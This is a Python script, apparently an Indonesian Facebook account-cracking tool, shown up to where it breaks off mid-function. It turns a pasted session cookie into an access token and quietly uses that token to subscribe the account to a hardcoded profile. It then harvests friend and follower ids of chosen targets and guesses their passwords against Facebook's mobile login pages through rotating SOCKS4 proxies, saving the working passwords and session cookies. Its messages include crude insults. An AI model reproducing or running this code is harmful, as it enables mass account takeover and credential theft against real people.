#!/usr/bin/python3
#coding=utf-8
#AHHHH
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        print("\t [!] Sedang menginstal module rich")
        os.system("python -m pip install --upgrade pip && pip install rich")
try:
	import requests
except ImportError:
	print("\t [!] Sedang menginstal module requests")
	os.system("pip install requests")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module mechanize")
	os.system("pip install mechanize")
#Huh Why? Kentod
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
pwpluss=[]
pwnya=[]
ses=requests.Session()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	#prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	#prox= requests.get('https://spys.me/socks.txt').text
	open('.proxy_bokep.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mGaruk_Peler')
#### WARNA PELER
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
kolor = random.choice([M,K,H,B,O,P])
##### UA TAI
__peler__ = "100027796542918"
__bokep__ = "b-api.facebook.com"
__tytyd__ = "mbasic.facebook.com"
__pepex__ = "m.facebook.com"
__zuck__ = "free.facebook.com"
__dev__ = "developer.facebook.com"
####BULAN
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
__join__ = ''+str(tgl)+' '+str(bln)+' '+str(thn)+''
def clear():
	os.system('clear')
def back():
	login()
def jalan(Kiya):
	for Aang in Kiya + "\n":
		sys.stdout.write(Aang)
		sys.stdout.flush()
		time.sleep(0.03)
########## GAMBAR MEMEQ#########
def banner():
	print("""
______________________________________________________
_______  ______ _______ _______ _     _ _______  ______
|       |_____/ |_____| |       |____/  |______ |_____/
|_____  |    \_ |     | |_____  |    \_ |______ |    \_
______________________________________________________
Github : https://github.com/HafizdXD
Wa       : 085758862225
version 0.2\n""")
###LOGIN KUKIS
def kontol():
	os.system("git pull")
	os.system('clear')
	jalan("SILAHKAN MASUKKAN USERNAME UNTUK MELANJUTKAN\n")
	username = input("USERNAME : \033[: \033[1;92m")
	if username =="HAFIZD-GANTENG":
		print("BERHASIL MASUK")
		time.sleep(1)
		masuk()
	else:
		jalan(" USERNAME SALAH ! !")
		time.sleep(1);kontol()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			masuk()
		except requests.exceptions.ConnectionError:
			print("%s %s Sinyal Lu Kek Tai Bngsd"%(H,P));exit()
	except IOError:
		masuk()
########## MENU LOGIN ##########
def masuk():
	os.system('clear');banner()
	print("%s#%s Menu login"%(M,P))
	print("%s╰───%s(%s1%s). Login dengan cookies"%(H,P,O,P))
	print("%s╰───%s(%s2%s). CRACK IG"%(H,P,O,P))
	print("%s╰───%s(%s0%s). Exit program"%(H,P,O,P))
	__sas__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __sas__ in ["1", "01"]:
		gimana()
	elif __sas__ in ["2", "02"]:
		___login___()
	elif __sas__ in ["0", "00"]:
		print("\n%s#%s Notice me"%(M,P))
		jalan("%s╰───%s Selamat tinggal semoga harimu indah"%(H,P))
		exit()
########## LOGIN COOKIE ##########
def gimana():
	try:
		os .system ('clear')
		os.system("git pull")
		cookie = input("\n%s#%s cookies : %s"%(M,P,HA))
		memek=requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", memek.text)
		ken=open(".token.txt", "w").write(find_token.group(1));peler()
		cok=open(".cok.txt", "w").write(cookie)
		print("\n%s#%s Berhasil"%(M,P))
		jalan("%s%s login berhasil"%(H,P));time.sleep(1)
		login()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print("\n%s#%s Gagal"%(M,P))
		jalan("%s%s login gagal"%(H,P));time.sleep(1)
		jalan("%s%s Mungkin Akun Cp"%(H,P))
		exit()
def peler():
	try:
		requests.post(f"https://graph.facebook.com/{__peler__}?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
########## MENU ##########
def menu(__nama__,__idz__):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print("%s╰───%s Cookies anda invalid"%(H,P))
		time.sleep(2);gimana()
	os.system('clear');banner()
	__IP__ = requests.get("https://api.ipify.org").text
	print("%s●%s Informasi user"%(M,P));time.sleep(0.03)
	print(f"{H}{P} Bergabung Pada : {H}{__join__}{P}\n");time.sleep(0.03)
	print("%s●%s MENU"%(M,P));time.sleep(0.03)
	print("%s%s%s1%s. Crack Publik (Massal)"%(H,P,O,P));time.sleep(0.03)
	print("%s%s%s2%s. Crack followers"%(H,P,O,P));time.sleep(0.03)
	print("%s%s%s3%s. Lihat Hasil Crack"%(H,P,O,P));time.sleep(0.03)
	print("%s%s%s4%s. Informasi tools"%(H,P,O,P));time.sleep(0.03)
	print("%s%s%s5%s. CRACK IG"%(H,P,O,P));time.sleep(0.03)
	print("%s%s%s0%s. Exit (%shapus cookie%s)"%(H,P,O,P,M,P));time.sleep(0.03)
	__kya__ = input("\n%s%s Input : "%(M,P));time.sleep(0.03)
	if __kya__ in ["1", "01"]:
		publik()
	elif __kya__ in ["2", "02"]:
		follower()
	elif __kya__ in ["3", "03"]:
		result()
	elif __kya__ in ["4", "04"]:
		informasi()
	elif __kya__ in ["5", "05"]:
		___login___()
	elif __kya__ in ["0", "00"]:
		os.system('rm -rf .token.txt');os.system('rm -rf .cookie.txt')
		jalan("%s╰───%s Tunggu, sedang menghapus info login"%(H,P));time.sleep(2)
		print("%s╰───%s Info login berhasil terhapus"%(H,P))
		exit()
	else:
		print("%s╰───%s Input anda salah"%(H,P));back()
########## CEK RESULTS ##########
def result():
	print("\n%s#%s Check results crack"%(M,P))
	print("%s╰───%s(%s1%s). Results %sOK%s saya"%(H,P,O,P,H,P))
	print("%s╰───%s(%s2%s). Results %sCP%s saya"%(H,P,O,P,K,P))
	print("%s╰───%s(%s0%s). Kembali ke menu"%(H,P,O,P))
	__kentod__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __kentod__ in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s╰───%s Anda belum punya results OK"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({H}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s╰───%s Input anda salah"%(H,P));back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{P}╰───{H}{cpkuni[0]}|{cpkuni[1]}");time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
		if len(vin)==0:
			print("%s╰───%s Anda belum punya results CP"%(H,P));time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s╰───%s(%s%s%s). %s ({K}%s{P}) id'%(H,P,O,nom,P,isi,len(hem)))
			geeh = input("\n%s#%s Input nomor file : "%(M,P))
			try:geh = lol[geeh]
			except KeyError:
				print("%s╰───%s Input anda salah"%(H,P));back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print("%s╰───%s File ndak ada"%(H,P));time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}╰───{K} {cpkuni[0]}|{cpkuni[1]}');time.sleep(0.03)
				nocp +=1
			input("\n%s#%s Tekan enter"%(M,P));back()
	elif __kentod__ in ['3']:
		back()
########## PUBLIK ##########
def publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		__sas__ = int(input(f"\n{M}#{P} dump berapa id (max 20): "))
	except ValueError:
		print("%s%s Masukin Yg Bener Kontol!!"%(H,P));exit()
	if __sas__<1 or __sas__>100:
		print("%s%s Gagal dump"%(H,P));exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"{H}╰───{P} Enter target ke {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print("\n%s%s Koneksi internet eror"%(H,P));exit()
	try:
		jalan(f"{H}{P} Berhasil Mengumpulkan Total Id {H}{str(len(id))}{P} id")
		setting()
	except requests.exceptions.ConnectionError:
		print("\n%s%s Koneksi internet eror"%(H,P))
		back()
	except (KeyError,IOError):
		print("%s%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## FOLLOWER ##########
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print("\n%s#%s Ketik %sme%s untuk dump followers sendiri"%(M,P,H,P))
	__janda__ = input("%s%s Enter target id : "%(H,P))
	try:
		Kiya = requests.get(f'https://graph.facebook.com/{__janda__}?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in Kiya['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		jalan(f"{H}{P} Berhasil dump {H}{str(len(id))}{P} id");setting()
	except requests.exceptions.ConnectionError:
		print("\n%s%s Koneksi internet eror"%(H,P));time.sleep(2)
		back()
	except (KeyError,IOError):
		print("%s%s Target private/tidak memiliki teman"%(H,P));time.sleep(2)
		back()
########## ATUR ID CRACK ##########
def setting():
	print("\n%s#%s pilih"%(M,P))
	# print("%s╰───%s(%s1%s). Crack dari id tertua"%(H,P,O,P))
	# print("%s╰───%s(%s2%s). Crack dari id termuda"%(H,P,O,P))
	print("%s%s(%s3%s). Crack random id"%(H,P,O,P))
	__sas__ = input("\n%s#%s Pilih : "%(M,P))
	if __sas__ in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif __sas__ in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif __sas__ in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print("%s%s Masukin Yg Bener Babi"%(H,P));exit()
	print("\n%s#%s Pilih Methode Crack Coba satu satu"%(M,P))
	print("%s%s(%s1%s). Metode mbasic (%sLambat%s)"%(H,P,O,P,K,P))
	print("%s%s(%s2%s). Metode mobile fb (%sSangad Lambat%s)"%(H,P,O,P,H,P))
	__kon__ = input("\n%s#%s Input 1 sampai 2 : "%(M,P))
	if __kon__ in [""]:
		print("%s%s Input yang bener"%(H,P));setting()
	elif __kon__ in ["1", "01"]:
		method.append("mbasic")
	elif __kon__ in ["2", "02"]:
		method.append("mobile")
	else:
		method.append('mbasic')
	pwplus = input("\n%s#%s Tambahkan password manual (y/t): "%(M,P))
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print("%s%s Gunakan %skoma%s sebagai pemisah"%(H,P,H,P))
		print("%s%s Contoh : %sMuka,mu,kayak,peler%s"%(H,P,H,P))
		pwku=input("\n%s#%s Masukan password : "%(M,P))
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	apk = input("%s%s Tampilkan apk terkait (y/t) : "%(H,P))
	if apk in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	kunaon()
########## MOBILE ##########
def crack(idf,pwv):
	global loop,ok,cp
	cuk = random.choice([M,U,K,A,B,E,H,O,P])
	sys.stdout.write(f"\r{M}# {P}Crack ({cuk}{loop}/{len(id)}{P}) Ok/{H}{ok}{P} -> Cp/{K}{cp}{P} "),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({
					'Host': 'm.facebook.com',
					'cache-control': 'max-age=0',
					'sec-ch-ua-mobile': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': 'Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			p = ses.get(f'https://{__pepex__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2F{__pepex__}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":"https://"+__pepex__+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
				'Host': 'm.facebook.com',
				'connection': 'keep-alive',
				'content-Length': '142',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://developer.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': 'Mozilla/5.0 (Linux; U; Android 11; zh-cn; Mi 10 Pro Build/RKQ1.200710.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.14',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'empty',
				'referer': f'https://{__pepex__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9'
			}
			po = ses.post(
					f'https://{__pepex__}/login/device-based/validate-password/?shbl=0&locale2=id_ID',
					data=dataa,
					cookies={'cookie': koki},
					headers=heade,
					allow_redirects=False,
					proxies=proxs
				)
			if "checkpoint" in po.cookies.get_dict().keys():
				print("\r%s%s %s|%s              %s"%(P,E,idf,pw,P))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Opera/8.01 (J2ME/MIDP; Opera Mini/1.1.5005/hifi/tmobile/at; Nokia 5300; de; U; ssr)"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r%s%s %s|%s               \n%s%s"%(P,HA,idf,pw,kuki,P))     
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OKl/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print("\r%s%s %s|%s|%s\n%s%s"%(P,HA,idf,pw,kuki,infoakun,P))     
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## MBASIC ##########
def crackmbasic(idf,pwv):
	global loop,ok,cp
	cuk = random.choice([M,K,H,O,P])
	sys.stdout.write(f"\r{M}# {P}Crack ({cuk}{loop}/{len(id)}{P}) Ok/{H}{ok}{P} -> Cp/{K}{cp}{P} "),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({
					'Host': 'mbasic.facebook.com',
					'cache-control': 'max-age=0',
					'sec-ch-ua-mobile': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': 'Mozilla/4.0 BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			p = ses.get(f'https://{__tytyd__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2F{__tytyd__}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
						"uid":idf,
						"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
						"flow":"login_no_pin",
						"pass":pw,
					}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
				'Host': 'mbasic.facebook.com',
				'connection': 'keep-alive',
				'content-Length': '142',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://'+__dev__,
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': 'Mozilla/5.0 (Linux; U; Android 10; en-US; Redmi 8A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'empty',
				'referer': f'https://{__tytyd__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2F{__tytyd__}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&